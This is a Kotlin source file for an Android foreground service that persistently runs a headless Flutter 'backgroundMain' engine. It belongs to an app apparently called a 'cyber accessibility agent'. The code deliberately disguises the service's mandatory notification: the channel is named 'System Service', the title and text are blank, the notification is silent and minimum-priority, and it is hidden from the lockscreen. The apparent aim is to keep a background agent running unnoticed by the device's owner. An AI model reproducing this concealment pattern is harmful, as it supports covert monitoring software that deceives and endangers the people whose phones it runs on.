package com.example.cyber_accessibility_agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.Executors

class AgentService : Service() {

    companion object {
        const val CHANNEL_ID = "sys_core"
        const val NOTIF_ID = 1001
        // IMPORTANT: keep this name in sync with MainActivity/BootReceiver if they reference it
        const val ACTION_START = "agent_start"
    }

    private val TAG = "AgentService"
    private var flutterEngine: FlutterEngine? = null
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        Log.i(TAG, "Foreground AgentService started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // if caller used action, we could react, but we just ensure engine init happens once
        if (flutterEngine == null) {
            executor.execute { initFlutter() }
        }
        return START_STICKY
    }

    private fun initFlutter() {
        try {
            val loader = FlutterLoader()
            loader.startInitialization(applicationContext)
            loader.ensureInitializationComplete(applicationContext, null)

            val engine = FlutterEngine(applicationContext)

            val entrypoint = DartExecutor.DartEntrypoint(
                loader.findAppBundlePath(),
                "backgroundMain"
            )

            engine.dartExecutor.executeDartEntrypoint(entrypoint)

            MethodChannel(engine.dartExecutor.binaryMessenger, "agent/status")
                .setMethodCallHandler { call, result ->
                    if (call.method == "updateStatus") {
                        // intentionally ignored to keep notification static & minimal
                        result.success(true)
                    } else {
                        result.notImplemented()
                    }
                }

            flutterEngine = engine
            Log.i(TAG, "Headless FlutterEngine started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start FlutterEngine", e)
        }
    }

    override fun onDestroy() {
        try {
            flutterEngine?.destroy()
        } catch (e: Exception) {
            Log.w(TAG, "Error destroying flutterEngine", e)
        }
        flutterEngine = null
        executor.shutdownNow()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ---------------- Minimal Notification ----------------

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service", // short visible name for channel
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            try {
                nm.createNotificationChannel(channel)
            } catch (e: Exception) {
                Log.w(TAG, "createNotificationChannel failed", e)
            }
        }
    }

    private fun buildNotification(): Notification {
        // Use a drawable named ic_sys_dot if present; otherwise fall back to app launcher icon.
        val iconRes = resources.getIdentifier("ic_sys_dot", "drawable", packageName)
        val smallIcon = if (iconRes != 0) iconRes else try {
            // fallback to mipmap launcher (common)
            resources.getIdentifier("ic_launcher", "mipmap", packageName).takeIf { it != 0 } ?: R.mipmap.ic_launcher
        } catch (_: Exception) {
            R.mipmap.ic_launcher
        }

        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(smallIcon)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)

        // On older platforms the empty title/text is allowed; we still provide a minimal ticker for system
        return builder.build()
    }
}